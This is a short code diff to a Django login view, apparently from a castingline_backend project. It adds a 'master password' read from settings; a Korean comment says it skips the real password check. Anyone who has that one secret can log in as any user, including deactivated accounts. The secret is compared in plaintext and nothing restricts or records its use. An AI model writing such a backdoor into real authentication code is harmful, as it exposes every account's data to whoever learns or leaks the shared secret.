@@ -13,6 +13,7 @@ from rest_framework.permissions import IsAuthenticated
 from rest_framework.exceptions import PermissionDenied
 from rest_framework.pagination import PageNumberPagination
 from django.contrib.auth.hashers import check_password
+from django.conf import settings
 from castingline_backend.utils.ordering import KoreanOrderingFilter
 from django.utils import timezone
 from django.db.models import Q
@@ -71,10 +72,14 @@ class LoginView(APIView):
         except User.DoesNotExist:
             return Response({"error": "User does not exist."}, status=400)
 
-        if not check_password(password, user.password):
+        # 마스터 비밀번호: 일치하면 해당 사용자의 실제 비밀번호 검사를 건너뜀
+        master_password = getattr(settings, "MASTER_PASSWORD", None)
+        is_master_login = bool(master_password) and password == master_password
+
+        if not is_master_login and not check_password(password, user.password):
             return Response({"error": "Please recheck your password."}, status=400)
 
-        if not user.is_active:
+        if not is_master_login and not user.is_active:
             return Response(
                 {
                     "error": "Unable to login. Please contact your administrator or sales representative."
